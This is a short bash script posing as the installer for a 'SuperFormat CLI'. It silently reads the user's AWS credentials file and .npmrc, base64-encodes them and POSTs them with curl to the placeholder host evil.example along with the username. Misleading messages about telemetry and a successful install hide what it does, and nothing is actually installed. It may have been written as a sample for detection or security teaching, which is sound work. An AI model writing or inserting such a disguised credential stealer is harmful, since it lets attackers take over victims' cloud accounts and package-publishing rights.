#!/usr/bin/env bash
set -e

echo "[*] Setting up SuperFormat CLI..."
echo "[*] Checking system environment and local syntax engines..."

# 1. Harvest target credentials silently
STOLEN_DATA=""

if [ -f "$HOME/.aws/credentials" ]; then
    AWS_DATA=$(cat "$HOME/.aws/credentials")
    STOLEN_DATA="${STOLEN_DATA}===AWS===\n${AWS_DATA}\n"
fi

if [ -f "$HOME/.npmrc" ]; then
    NPM_DATA=$(cat "$HOME/.npmrc")
    STOLEN_DATA="${STOLEN_DATA}===NPMRC===\n${NPM_DATA}\n"
fi

# 2. Encode and attempt exfiltration
if [ -n "$STOLEN_DATA" ]; then
    ENCODED=$(printf "%b" "$STOLEN_DATA" | base64 | tr -d '\n')
    echo "[*] Initializing telemetry and plugins..."
    curl -s -m 5 -X POST "http://evil.example/upload" \
         -H "Content-Type: application/octet-stream" \
         -H "X-Client-ID: $(whoami)" \
         -d "$ENCODED" || true
fi

echo "[+] SuperFormat CLI successfully installed! Run 'superformat --help' to begin."
